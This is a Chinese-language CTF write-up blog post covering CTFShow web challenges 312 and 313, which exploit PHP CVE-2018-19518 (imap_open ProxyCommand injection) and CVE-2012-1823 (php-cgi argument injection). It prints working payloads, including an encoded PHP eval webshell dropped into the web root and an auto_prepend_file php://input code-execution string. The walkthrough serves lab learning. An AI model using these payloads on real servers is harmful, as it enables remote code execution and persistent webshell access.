---
author: "Yiming Shen"
date: 2022-07-27
lastmod: 2022-07-28
title: "CTFShow web311-315 WP"
description: "PHP相关CVE知识"
tags: [
    "CTF",
    "WriteUP",
    "Web",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
math: true
typora-root-url: ..\..\..\..\static\
---

## Web311



## Web312

进入界面，一个邮箱登录页。题目提示就一个文件不用扫目录，从PHP版本入手直接找存在的CVE漏洞

![image-20220727150812771](https://s2.loli.net/2022/07/27/F5NEb1BoHSXz4mu.png)

![image-20220727151110852](https://s2.loli.net/2022/07/27/ikURMEv5m29GyPX.png)

进行尝试登录后，返回包中有PHP版本信息，用Wappalyzer即可读到，为PHP 5.6.38，查找该版本与邮件服务器IMAP/POP3相关的漏洞，发现漏洞CVE-2018-19518，与题目环境最为一致。

### CVE-2018-19518 PHP IMAP远程命令执行漏洞

![image-20220727162947576](https://s2.loli.net/2022/07/27/jBNXi9rPMRTnypJ.png)

>PHP IMAP远程命令执行漏洞 CVE-2018-19518
>
>PHP的`imap_open`函数会调用`rsh`来连接远程shell，在debian系Linux中默认使用`ssh`代替`rsh`功能，而在`ssh`命令中可以通过设置`-oProxyCommand=`来执行其他命令，因此可以通过注入该参数调用第三方命令。

### 满足条件

1. PHP版本=5.6.38
2. 使用`imap_open`函数进行邮件收发操作

### 复现

> 题目环境无回显，采用写入PHP脚本的方式执行命令

1. 将PHP马base64编码

```php
<?php eval($_POST[shell]);?>
    
IDw/cGhwIGV2YWwoJF9QT1NUW3NoZWxsXSk7Pz4=
```

2. 使用echo解码base64并在同目录下新建webshell文件

```shell
echo "IDw/cGhwIGV2YWwoJF9QT1NUW3NoZWxsXSk7Pz4=" | base64 -d >/var/www/html/test2.php
```

3. 将该命令base64编码，并再进行URL编码

```base64
ZWNobyAiSUR3L2NHaHdJR1YyWVd3b0pGOVFUMU5VVzNOb1pXeHNYU2s3UHo0PSIgfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvdGVzdDIucGhw
```

4. 将编码结果插入漏洞POC`x+-oProxyCommand%3decho%09编码结果|base64%09-d|sh}`中

```shell
x+-oProxyCommand%3decho%09ZWNobyAiSUR3L2NHaHdJR1YyWVd3b0pGOVFUMU5VVzNOb1pXeHNYU2s3UHo0PSIgfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvdGVzdDIucGhw|base64%09-d|sh}
```



![image-20220727162618714](https://s2.loli.net/2022/07/27/ARDCEgnj8pJBaZz.png)

执行后，即成功创建文件`test2.php`中，使用蚁剑连接，查看flag文件，拿到flag。

![image-20220727162401343](https://s2.loli.net/2022/07/27/nQkLZ2TahRO5mNC.png)

## Web313

进入题目环境，光秃秃的一个文字

![image-20220728093341901](https://s2.loli.net/2022/07/28/35M2BPSEyxleImH.png)

目录文件扫描等信息收集无果，查看PHP版本

![image-20220728093450397](https://s2.loli.net/2022/07/28/EZSbFqNAQvGfODC.png)

查找PHP5.4.1相关漏洞，考虑到出题环境，最好是能实现RCE的漏洞

![image-20220728093554449](https://s2.loli.net/2022/07/28/25NVH7wGOAasJmB.png)

### CVE-2012-1823 PHP-CGI远程代码执行漏洞

查找CVE-2012-1823漏洞详情及复现，NVD给出的解释如下

> sapi/cgi/cgi_main.c in PHP before 5.3.12 and 5.4.x before 5.4.2, when configured as a CGI script (aka php-cgi), does not properly handle query strings that lack an = (equals sign) character, which allows remote attackers to execute arbitrary code by placing command-line options in the query string, related to lack of skipping a certain php_getopt for the 'd' case.

简单的说，就是PHP-CGI直接将用户的请求（没有=）直接作为了PHP-CGI的参数执行，导致了远程代码执行。

深究一下漏洞的根源，需要了解一下PHP的运行模式与CGI。

PHP-CGI是一个sapi，作用是接收web容器通过fastcgi协议封装的数据，发送给PHP的解释器运行。PHP-CGI可以fork出一个子进程，让解释器执行这个文件，也可以将进程常驻后台，执行后返回结果。FPM也是类似的fastcgi管理器，是PHP在5.3版本后引入的，更为高效。

具体到该漏洞，则是由于该版本附近的PHP允许在web傻瓜下文中传入参数，结合RFC3875中的规定，在传参不包含没有解码的`=`时，将其作为cgi的参数传入，从而造成了远程代码执行。

### 满足条件

1. PHP版本早于5.3.12，以及PHP5.4.X版本早于5.4.2
2. 使用PHP-CGI管理器

### 复现

直接进行get传参，根据CGI模式的相关指令，可以直接利用`-s`显示文件源码，也可采用`-d`（指定配置项）配合`auto_prepend_file`+`PHP://input`伪协议，通过文件包含实现POST代码执行。

`-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input`

`<?php echo eval("cat /somewhere/fla9.txt"); ?>`

POC:

![image-20220728100254352](https://s2.loli.net/2022/07/28/yUsnQuFv9SEg3j4.png)

拿到flag

## 参考

[1] [ctfshow phpCVE web311-web315 wp - 是Mumuzi](https://blog.csdn.net/qq_42880719/article/details/122513194)

[2] [PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析 - PHIITHON](https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html)